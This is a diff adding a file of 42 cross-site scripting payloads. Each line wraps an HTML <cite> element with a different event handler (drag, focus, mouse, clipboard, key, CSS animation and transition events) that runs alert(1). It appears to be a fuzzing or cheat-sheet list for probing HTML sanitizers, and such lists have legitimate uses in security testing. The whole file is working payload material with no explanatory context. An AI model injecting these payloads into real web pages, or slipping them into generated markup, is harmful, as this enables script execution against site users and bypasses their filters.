@@ -1,0 +1,42 @@
+<cite draggable="true" ondrag="alert(1)">test</cite>
+<cite draggable="true" ondragend="alert(1)">test</cite>
+<cite draggable="true" ondragenter="alert(1)">test</cite>
+<cite draggable="true" ondragleave="alert(1)">test</cite>
+<cite draggable="true" ondragstart="alert(1)">test</cite>
+<cite id=x tabindex=1 onactivate=alert(1)></cite>
+<cite id=x tabindex=1 onbeforeactivate=alert(1)></cite>
+<cite id=x tabindex=1 onbeforedeactivate=alert(1)></cite><input autofocus>
+<cite id=x tabindex=1 ondeactivate=alert(1)></cite><input id=y autofocus>
+<cite id=x tabindex=1 onfocus=alert(1)></cite>
+<cite id=x tabindex=1 onfocusin=alert(1)></cite>
+<cite onbeforecopy="alert(1)" contenteditable>test</cite>
+<cite onbeforecut="alert(1)" contenteditable>test</cite>
+<cite onbeforepaste="alert(1)" contenteditable>test</cite>
+<cite onblur=alert(1) tabindex=1 id=x></cite><input autofocus>
+<cite onclick="alert(1)">test</cite>
+<cite oncontextmenu="alert(1)">test</cite>
+<cite oncopy="alert(1)" contenteditable>test</cite>
+<cite oncut="alert(1)" contenteditable>test</cite>
+<cite ondblclick="alert(1)">test</cite>
+<cite onfocusout=alert(1) tabindex=1 id=x></cite><input autofocus>
+<cite onkeydown="alert(1)" contenteditable>test</cite>
+<cite onkeypress="alert(1)" contenteditable>test</cite>
+<cite onkeyup="alert(1)" contenteditable>test</cite>
+<cite onmousedown="alert(1)">test</cite>
+<cite onmouseenter="alert(1)">test</cite>
+<cite onmouseleave="alert(1)">test</cite>
+<cite onmousemove="alert(1)">test</cite>
+<cite onmouseout="alert(1)">test</cite>
+<cite onmouseover="alert(1)">test</cite>
+<cite onmouseup="alert(1)">test</cite>
+<cite onpaste="alert(1)" contenteditable>test</cite>
+<div draggable="true" contenteditable>drag me</div><cite ondragover=alert(1) contenteditable>drop here</cite>
+<div draggable="true" contenteditable>drag me</div><cite ondrop=alert(1) contenteditable>drop here</cite>
+<style>:target {color: red;}</style><cite id=x style="transition:color 10s" ontransitioncancel=alert(1)></cite>
+<style>:target {color:red;}</style><cite id=x style="transition:color 1s" ontransitionend=alert(1)></cite>
+<style>:target {transform: rotate(180deg);}</style><cite id=x style="transition:transform 2s" ontransitionrun=alert(1)></cite>
+<style>@keyframes slidein {}</style><cite style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></cite>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><cite id=x style="position:absolute;" onanimationcancel="alert(1)"></cite>
+<style>@keyframes x{}</style><cite style="animation-name:x" onanimationend="alert(1)"></cite>
+<style>@keyframes x{}</style><cite style="animation-name:x" onanimationstart="alert(1)"></cite>
+<svg><cite onload=alert(1)></cite>
